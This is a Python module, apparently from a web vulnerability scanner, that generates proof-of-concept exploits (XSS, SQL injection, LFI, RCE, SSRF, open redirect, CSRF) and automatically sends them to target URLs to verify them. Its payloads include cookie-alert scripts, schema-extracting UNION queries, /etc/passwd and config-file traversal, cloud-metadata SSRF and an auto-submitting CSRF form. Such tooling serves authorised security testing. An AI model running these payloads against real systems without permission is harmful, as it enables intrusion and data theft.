import asyncio
import aiohttp
import json
import base64
import random
import string
import os
from ..utils.helpers import LOG
from ..config import EXPLOITS_PATH

class ExploitGenerator:
    """Generates proof-of-concept exploits for found vulnerabilities"""
    
    def __init__(self):
        self.exploit_templates = self._load_templates()
        self.generated_exploits = {}
        self.exploitation_results = {}
        
    def _load_templates(self):
        """Load exploit templates"""
        templates = {
            'xss': [],
            'sqli': [],
            'lfi': [],
            'rce': [],
            'ssrf': [],
            'csrf': [],
            'open_redirect': []
        }
        
        try:
            if not os.path.exists(EXPLOITS_PATH):
                os.makedirs(EXPLOITS_PATH)
                LOG("[!] Created exploits directory")
                
            for vuln_type in templates.keys():
                template_file = os.path.join(EXPLOITS_PATH, f"{vuln_type}_templates.json")
                if os.path.exists(template_file):
                    with open(template_file, 'r', encoding='utf-8') as f:
                        templates[vuln_type] = json.load(f)
                    LOG(f"[*] Loaded {len(templates[vuln_type])} {vuln_type} exploit templates")
                else:
                    # Create default templates
                    with open(template_file, 'w', encoding='utf-8') as f:
                        if vuln_type == 'xss':
                            default_templates = [
                                {
                                    "name": "Alert Cookie",
                                    "template": "<script>alert(document.cookie)</script>",
                                    "description": "Basic XSS exploit showing cookies"
                                },
                                {
                                    "name": "Image Onerror",
                                    "template": "<img src=x onerror=\"alert('XSS')\">",
                                    "description": "XSS via image error event"
                                }
                            ]
                        elif vuln_type == 'sqli':
                            default_templates = [
                                {
                                    "name": "Extract Schema",
                                    "template": "' UNION SELECT table_name,column_name,1 FROM information_schema.columns -- ",
                                    "description": "Extract database schema"
                                }
                            ]
                        else:
                            default_templates = []
                            
                        json.dump(default_templates, f, indent=2)
                        templates[vuln_type] = default_templates
                        LOG(f"[*] Created default {vuln_type} exploit templates")
            
        except Exception as e:
            LOG(f"[!] Error loading exploit templates: {e}")
            
        return templates
        
    def _generate_random_string(self, length=8):
        """Generate a random string for exploit markers"""
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
        
    async def generate_exploit(self, vulnerability):
        """Generate a proof-of-concept exploit for a vulnerability"""
        vuln_type = vulnerability.get('type', '')
        url = vulnerability.get('url', '')
        param = vulnerability.get('param', '')
        payload = vulnerability.get('payload', '')
        
        if not url or not vuln_type:
            LOG(f"[!] Cannot generate exploit: missing URL or vulnerability type")
            return None
            
        # Get templates for this vulnerability type
        templates = self.exploit_templates.get(vuln_type, [])
        if not templates:
            LOG(f"[!] No exploit templates found for {vuln_type}")
            return None
            
        # Select best template
        template = templates[0] if templates else {"template": payload, "name": "Custom Payload"}
        
        # Generate unique marker
        marker = self._generate_random_string()
        
        try:
            # Create exploit based on vulnerability type
            if vuln_type == 'xss':
                poc = self._generate_xss_exploit(url, param, template, marker)
            elif vuln_type == 'sqli':
                poc = self._generate_sqli_exploit(url, param, template, marker)
            elif vuln_type == 'lfi':
                poc = self._generate_lfi_exploit(url, param, template, marker)
            elif vuln_type == 'rce':
                poc = self._generate_rce_exploit(url, param, template, marker)
            elif vuln_type == 'ssrf':
                poc = self._generate_ssrf_exploit(url, param, template, marker)
            elif vuln_type == 'open_redirect':
                poc = self._generate_redirect_exploit(url, param, template, marker)
            elif vuln_type == 'csrf':
                poc = self._generate_csrf_exploit(url, param, template, marker)
            else:
                LOG(f"[!] Unsupported vulnerability type for exploit generation: {vuln_type}")
                return None
                
            # Store generated exploit
            exploit_id = f"{vuln_type}_{marker}"
            self.generated_exploits[exploit_id] = poc
            
            LOG(f"[*] Generated {vuln_type} exploit for {url}: {exploit_id}")
            return poc
            
        except Exception as e:
            LOG(f"[!] Error generating exploit: {e}")
            return None
    
    def _generate_xss_exploit(self, url, param, template, marker):
        """Generate XSS proof-of-concept"""
        template_code = template.get('template', "<script>alert('XSS')</script>")
        name = template.get('name', 'XSS Exploit')
        
        # Modify payload to include marker
        modified_payload = template_code.replace("alert(", f"alert('{marker}'+")
        
        # Create HTML PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={modified_payload}"
            else:
                exploit_url = f"{url}?{param}={modified_payload}"
        else:
            exploit_url = url
            
        html_poc = f"""
        <!DOCTYPE html>
        <html>
        <head><title>XSS PoC for {url}</title></head>
        <body>
            <h3>XSS Proof of Concept</h3>
            <p>URL: {url}</p>
            <p>Parameter: {param}</p>
            <p>Payload: {modified_payload}</p>
            <p>Click the link below to test:</p>
            <a href="{exploit_url}" target="_blank">Test XSS Exploit</a>
        </body>
        </html>
        """
        
        return {
            'type': 'xss',
            'name': name,
            'url': exploit_url,
            'html': html_poc,
            'marker': marker,
            'verification': f"Alert shows with marker: {marker}"
        }
        
    def _generate_sqli_exploit(self, url, param, template, marker):
        """Generate SQL Injection proof-of-concept"""
        template_code = template.get('template', "' UNION SELECT 1,2,3 -- ")
        name = template.get('name', 'SQLi Exploit')
        
        # Modify payload to include marker
        modified_payload = template_code
        if "UNION SELECT" in template_code:
            # Add marker to one of the selected columns for verification
            modified_payload = template_code.replace("1,", f"'{marker}',", 1)
            
        # Create SQL PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={modified_payload}"
            else:
                exploit_url = f"{url}?{param}={modified_payload}"
        else:
            exploit_url = url
            
        sql_poc = f"""
        -- SQL Injection Proof of Concept
        -- URL: {url}
        -- Parameter: {param}
        
        -- Original Payload:
        {template_code}
        
        -- Modified Payload with Marker:
        {modified_payload}
        
        -- Full URL:
        {exploit_url}
        
        -- Verification: 
        -- Look for results containing marker: {marker}
        """
        
        return {
            'type': 'sqli',
            'name': name,
            'url': exploit_url,
            'sql': sql_poc,
            'marker': marker,
            'verification': f"Results contain marker: {marker}"
        }
        
    def _generate_lfi_exploit(self, url, param, template, marker):
        """Generate LFI proof-of-concept"""
        template_code = template.get('template', "../../../etc/passwd")
        name = template.get('name', 'LFI Exploit')
        
        # Create LFI PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={template_code}"
            else:
                exploit_url = f"{url}?{param}={template_code}"
        else:
            exploit_url = url
            
        lfi_poc = f"""
        # Local File Inclusion Proof of Concept
        # URL: {url}
        # Parameter: {param}
        
        # Target Files to Try:
        - Linux: ../../../etc/passwd
        - Windows: ../../../windows/win.ini
        - Application Config: ../../../config/config.php
        - Application Logs: ../../../logs/error.log
        
        # Full URL:
        {exploit_url}
        
        # Verification: 
        # Look for file contents in the response
        """
        
        return {
            'type': 'lfi',
            'name': name,
            'url': exploit_url,
            'text': lfi_poc,
            'marker': marker,
            'verification': "File contents visible in response"
        }
        
    def _generate_rce_exploit(self, url, param, template, marker):
        """Generate RCE proof-of-concept"""
        template_code = template.get('template', "system('id')")
        name = template.get('name', 'RCE Exploit')
        
        # Modify payload to include marker
        modified_payload = f"system('echo {marker}')"
        
        # Create RCE PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={modified_payload}"
            else:
                exploit_url = f"{url}?{param}={modified_payload}"
        else:
            exploit_url = url
            
        rce_poc = f"""
        # Remote Code Execution Proof of Concept
        # URL: {url}
        # Parameter: {param}
        
        # Original Payload:
        {template_code}
        
        # Modified Payload with Marker:
        {modified_payload}
        
        # Full URL:
        {exploit_url}
        
        # Verification: 
        # Look for marker: {marker} in the response
        """
        
        return {
            'type': 'rce',
            'name': name,
            'url': exploit_url,
            'text': rce_poc,
            'marker': marker,
            'verification': f"Response contains marker: {marker}"
        }
        
    def _generate_ssrf_exploit(self, url, param, template, marker):
        """Generate SSRF proof-of-concept"""
        # Use a callback service to verify SSRF
        callback_url = f"https://webhook.site/{marker}"
        template_code = template.get('template', "http://internal-service/")
        name = template.get('name', 'SSRF Exploit')
        
        # Create SSRF PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={callback_url}"
            else:
                exploit_url = f"{url}?{param}={callback_url}"
        else:
            exploit_url = url
            
        ssrf_poc = f"""
        # Server-Side Request Forgery Proof of Concept
        # URL: {url}
        # Parameter: {param}
        
        # Testing URLs:
        - External callback: {callback_url}
        - Internal services: http://localhost/
        - Cloud metadata: http://169.254.169.254/latest/meta-data/
        
        # Full URL:
        {exploit_url}
        
        # Verification: 
        # Check for callbacks to webhook.site with the marker: {marker}
        """
        
        return {
            'type': 'ssrf',
            'name': name,
            'url': exploit_url,
            'text': ssrf_poc,
            'marker': marker,
            'verification': f"Callback received with marker: {marker}"
        }
        
    def _generate_redirect_exploit(self, url, param, template, marker):
        """Generate Open Redirect proof-of-concept"""
        redirect_url = f"https://example.com?marker={marker}"
        template_code = template.get('template', "https://evil.com")
        name = template.get('name', 'Open Redirect Exploit')
        
        # Create Redirect PoC
        if param:
            if '?' in url:
                exploit_url = f"{url}&{param}={redirect_url}"
            else:
                exploit_url = f"{url}?{param}={redirect_url}"
        else:
            exploit_url = url
            
        redirect_poc = f"""
        # Open Redirect Proof of Concept
        # URL: {url}
        # Parameter: {param}
        
        # Redirect URL with Marker:
        {redirect_url}
        
        # Full URL:
        {exploit_url}
        
        # Verification: 
        # Browser should redirect to example.com with the marker parameter
        """
        
        return {
            'type': 'open_redirect',
            'name': name,
            'url': exploit_url,
            'text': redirect_poc,
            'marker': marker,
            'verification': f"Redirects to example.com with marker: {marker}"
        }
        
    def _generate_csrf_exploit(self, url, param, template, marker):
        """Generate CSRF proof-of-concept"""
        name = template.get('name', 'CSRF Exploit')
        
        # Create HTML PoC
        csrf_poc = f"""
        <!DOCTYPE html>
        <html>
        <head><title>CSRF PoC for {url}</title></head>
        <body onload="document.csrf_form.submit()">
            <h3>CSRF Proof of Concept</h3>
            <p>URL: {url}</p>
            <p>The form below will be automatically submitted when this page loads.</p>
            <form name="csrf_form" action="{url}" method="POST">
                <input type="hidden" name="{param}" value="CSRF_{marker}_TEST">
                <input type="submit" value="Submit form manually">
            </form>
        </body>
        </html>
        """
        
        return {
            'type': 'csrf',
            'name': name,
            'url': url,
            'html': csrf_poc,
            'marker': marker,
            'verification': f"POST request sent with marker: {marker}"
        }
    
    async def verify_exploit(self, exploit, max_attempts=3):
        """Verify if exploit works by checking for marker in response"""
        if not exploit:
            return False
            
        exploit_url = exploit.get('url', '')
        marker = exploit.get('marker', '')
        
        if not exploit_url or not marker:
            LOG(f"[!] Cannot verify exploit: missing URL or marker")
            return False
            
        success = False
        attempt = 0
        
        while attempt < max_attempts and not success:
            attempt += 1
            try:
                async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
                    async with session.get(exploit_url, timeout=30, verify_ssl=False, allow_redirects=True) as response:
                        content = await response.text()
                        status = response.status
                        
                        # Check if marker is in response
                        if marker in content:
                            LOG(f"[*] Exploit verification successful: marker found in response")
                            success = True
                        elif exploit.get('type') == 'open_redirect' and status >= 300 and status < 400:
                            # Check location header for redirect exploits
                            location = response.headers.get('Location', '')
                            if marker in location:
                                LOG(f"[*] Redirect exploit verification successful: marker found in Location header")
                                success = True
                        else:
                            LOG(f"[!] Attempt {attempt}: Marker not found in response")
                            
            except Exception as e:
                LOG(f"[!] Error verifying exploit (attempt {attempt}): {e}")
                await asyncio.sleep(1)  # Wait before retry
                
        self.exploitation_results[exploit.get('name', '')] = {
            'success': success,
            'attempts': attempt,
            'url': exploit_url
        }
        
        return success
        
    async def process_vulnerabilities(self, vulnerabilities):
        """Process a list of vulnerabilities and generate exploits"""
        results = []
        
        for vuln in vulnerabilities:
            if isinstance(vuln, dict) and 'type' in vuln and 'url' in vuln:
                exploit = await self.generate_exploit(vuln)
                if exploit:
                    verified = await self.verify_exploit(exploit)
                    exploit['verified'] = verified
                    results.append(exploit)
                    
        LOG(f"[*] Generated and verified {len(results)} exploits")
        return results
        
    def save_exploits(self, output_dir=None):
        """Save all generated exploits to files"""
        if not output_dir:
            output_dir = os.path.join(EXPLOITS_PATH, 'generated')
            
        try:
            if not os.path.exists(output_dir):
                os.makedirs(output_dir)
                
            # Save each exploit
            for exploit_id, exploit in self.generated_exploits.items():
                exploit_type = exploit.get('type', 'unknown')
                exploit_name = exploit.get('name', 'unnamed').replace(' ', '_').lower()
                
                # Determine content and extension
                if 'html' in exploit:
                    content = exploit['html']
                    ext = 'html'
                elif 'sql' in exploit:
                    content = exploit['sql']
                    ext = 'sql'
                else:
                    content = exploit.get('text', json.dumps(exploit, indent=2))
                    ext = 'txt'
                    
                # Write to file
                filename = f"{exploit_type}_{exploit_name}_{exploit['marker']}.{ext}"
                filepath = os.path.join(output_dir, filename)
                
                with open(filepath, 'w', encoding='utf-8') as f:
                    f.write(content)
                    
                LOG(f"[*] Saved exploit to {filepath}")
                
            # Save summary report
            summary_file = os.path.join(output_dir, 'exploit_summary.json')
            with open(summary_file, 'w', encoding='utf-8') as f:
                summary = {
                    'exploits': self.generated_exploits,
                    'results': self.exploitation_results
                }
                json.dump(summary, f, indent=2)
                
            LOG(f"[*] Saved exploit summary to {summary_file}")
            return True
            
        except Exception as e:
            LOG(f"[!] Error saving exploits: {e}")
            return False 